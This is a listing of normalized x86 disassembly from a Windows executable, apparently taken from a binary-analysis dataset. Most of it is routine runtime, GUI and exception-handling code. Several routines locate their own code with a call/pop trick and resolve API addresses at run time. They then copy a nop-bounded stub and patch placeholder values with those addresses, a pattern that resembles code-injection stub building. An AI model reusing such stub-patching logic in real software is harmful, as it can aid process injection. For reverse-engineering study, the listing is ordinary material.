pop ecx
jne r-xdata
and [ eax + 0x4 ] 0x0
mov [ eax ] esi
pop esi
retn
pop esi
retn
sub_40c261
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ebp + 0x10 ] edi
xor ebx ebx
and [ ebp + 0x10 ] 0x3
lea esi [ ecx + eax + 0x8 ]
jne r-xdata
lea ebx [ esi + 0x1 ]
push 0x4
push 0x0
push ebx
mov [ esi ] 0x68
call sub_4087f0
sub edi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
add eax edi
push eax
push ebx
call sub_405400
mov ecx [ ebp + 0x8 ]
add esp 0x18
lea eax [ edi - 0x4 ]
push 0x5
pop ebx
add esi ebx
lea eax [ edi - 0x4 ]
jmp r-xdata
add [ ecx + 0x4 ] ebx
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
lea ecx [ esi + 0x1 ]
lea edi [ eax + 0x4 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
add ecx eax
shr edi 0x2
mov [ ebp + 0xc ] ecx
lea eax [ edi + ebx ]
lea ebx [ eax + edi * 4 ]
test eax eax
jl r-xdata
push 0x4
mov [ esi ] 0x68
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
call sub_405400
add [ ebp + 0x10 ] 0x5
sub [ ebp + 0xc ] 0x4
add esp 0xc
add esi 0x5
dec edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub_40c300
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x14 ]
mov eax [ esi + 0x4 ]
lea ecx [ eax + edi ]
cmp ecx [ esi ]
jle r-xdata
push edi
lea eax [ eax + esi + 0x8 ]
push [ esp + 0x14 ]
push eax
call sub_405400
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
retn
sub_40c333
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jle r-xdata
xor eax eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40d000
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
inc [ ebp + 0x8 ]
inc esi
cmp esi [ ebp + 0xc ]
jl r-xdata
pop esi
pop ebp
retn
sub_40c366
mov ecx [ esp + 0x8 ]
xor eax eax
push esi
lea edx [ ecx - 0x5 ]
test edx edx
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
inc eax
cmp eax edx
jl r-xdata
mov esi [ eax + ecx + 0x1 ]
cmp esi [ esp + 0x10 ]
je r-xdata
cmp [ eax + ecx ] 0xb8
jne r-xdata
pop esi
retn
mov edx [ esp + 0x14 ]
mov [ eax + ecx + 0x1 ] edx
sub_40c3c7
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7f
jg r-xdata
push 0x2
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x6
cmp [ ebp + 0xc ] 0xffffff80
jb r-xdata
push 0x2
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x3
jmp r-xdata
pop eax
pop ebp
retn
sub_40c436
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x100
push 0x2
jl r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x3
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x6
jmp r-xdata
pop eax
pop ebp
retn
sub_40c489
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x100
push 0x2
jl r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x3
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0x18
push 0x6
jmp r-xdata
pop eax
pop ebp
retn
sub_40c4dc
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x10 ] eax
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x28 ] eax
and [ ebp - 0x1c ] 0x0
push [ ebp + 0x8 ]
call sub_40c399
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x8 ]
call sub_40c3b0
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push 0x8
push [ ebp + 0x8 ]
call sub_40c489
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c245
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
shl eax 0x2
mov [ ebp - 0x8 ] eax
push 0xfffffffc
push [ ebp + 0x8 ]
call sub_40c3c7
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40c245
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x8 ] eax
push 0xfffffff8
push [ ebp + 0x8 ]
call sub_40c3c7
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
call sub_40c61d
mov eax [ ebp - 0x4 ]
push eax
mov eax 0x11111111
call eax
push esi
mov esi eax
cmp eax 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
mov eax [ ebp - 0x8 ]
push eax
push esi
mov eax 0x22222222
call eax
cmp eax 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
mov eax 0x33333333
call eax
call eax
sub_40c61d
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x14 ] eax
push 0x8
push rw-data
push 0x64
push [ ebp - 0x14 ]
call sub_40c333
add esp 0x10
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0xc ] eax
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x10 ]
push 0x11111111
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_40c366
add esp 0x10
push [ ebp - 0x28 ]
push 0x22222222
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_40c366
add esp 0x10
push [ ebp - 0x4 ]
push 0x33333333
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_40c366
add esp 0x10
mov eax [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40c436
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x8 ]
call sub_40c41f
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40c6fa
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jge r-xdata
cmp [ ebp + 0xc ] 0x10000
jl r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
push 0x1
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
push 0x2
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
push 0x3
pop eax
push 0x1
push rw-data
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
push 0x1
pop eax
jmp r-xdata
sub_40c75b
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0xc ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c245
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
shl eax 0x2
mov [ ebp - 0x4 ] eax
call sub_40c7bd
push esp
mov eax 0x11111111
call eax
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x20 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x20 ] 0xc8
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
push [ ebp - 0xc ]
push 0x11111111
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_40c366
add esp 0x10
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40c436
pop ecx
pop ecx
mov ecx [ ebp - 0x18 ]
add ecx eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x18 ]
push 0x8
push rw-data
push [ ebp - 0x1c ]
call sub_40d000
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
sub_40c7bd
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x20 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0xc8
jge r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_40c300
add esp 0xc
push [ ebp - 0xc ]
push 0x11111111
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_40c366
add esp 0x10
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40c436
pop ecx
pop ecx
mov ecx [ ebp - 0x18 ]
add ecx eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x8
push rw-data
push [ ebp - 0x1c ]
call sub_40d000
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
sub_40c934
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_40c970
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_40e9bc
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_40c998
mov eax sub_413a6c
call sub_40d394
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_40e99c
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_40ca27
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_40ca53
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_40cb2b
push esi
push edi
call sub_40ca53
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_40cb81
push ebp
mov ebp esp
sub esp 0x2c
call sub_40ca53
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40cb2b
jmp r-xdata
test eax eax
je r-xdata
sub_40cbec
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_40ca53
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_40ccda
mov eax sub_413bca
call sub_40d394
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_411c3e
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_40ea85
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_40ea85
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40ce86
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_40ceab
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_40ceff
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_40cf4b
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_403c8c
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_403ced
pop ecx
pop esi
retn
push esi
call sub_404e2a
pop ecx
sub_40cf90
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_40cfca
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_405735
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_40d000
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_40d0ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_40d0ee
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40d13d
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d592
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_40d173
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_40d1c7
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40ddb0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40d1c7
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40d592
add esp 0x20
pop ebp
retn
sub_40d1ec
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40d2a2
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_404c63
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40d2a2
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40d592
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40d0ee
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40d317
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40de5d
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40de5d
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
